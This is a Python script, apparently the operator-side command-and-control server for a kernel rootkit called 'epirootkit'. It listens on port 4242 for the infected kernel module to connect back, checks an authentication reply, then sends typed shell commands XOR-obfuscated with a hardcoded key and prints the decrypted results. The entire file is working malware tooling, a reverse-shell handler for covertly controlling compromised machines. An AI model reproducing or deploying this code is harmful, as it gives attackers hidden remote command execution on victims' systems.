import socket

KEY = b"epirootkit"
HOST = "0.0.0.0"
PORT = 4242


def xor(data: bytes) -> bytes:
    return bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(data))


def handle_client(client):
    try:
        client.sendall(b"epirootkit\n")

        auth_response = client.recv(2048)
        print("--- AUTH ---")
        print(auth_response.decode(errors="ignore").strip())
        print("------------\n")

        if b"FAIL" in auth_response:
            print("Authentication failed. Exiting.")
            return

        while True:
            cmd = input("epirootkit> ").strip()
            if not cmd:
                continue

            encrypted = xor(cmd.encode())
            client.sendall(encrypted)

            print("\n--- Response ---")
            buffer = ""

            while True:
                chunk = client.recv(2048)
                if not chunk:
                    print("Connection closed by kernel module.")
                    return

                decrypted = xor(chunk).decode(errors="ignore")
                if "--EOF--" in decrypted:
                    buffer += decrypted.replace("--EOF--", "")
                    break
                buffer += decrypted

            print(buffer.strip())
            print("---------------\n")

    except KeyboardInterrupt:
        print("\nExiting client.")
    finally:
        client.close()


def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, PORT))
        server.listen(1)
        print(f"[*] Waiting for connection on {HOST}:{PORT}...")

        client, addr = server.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")

        handle_client(client)


if __name__ == "__main__":
    main()
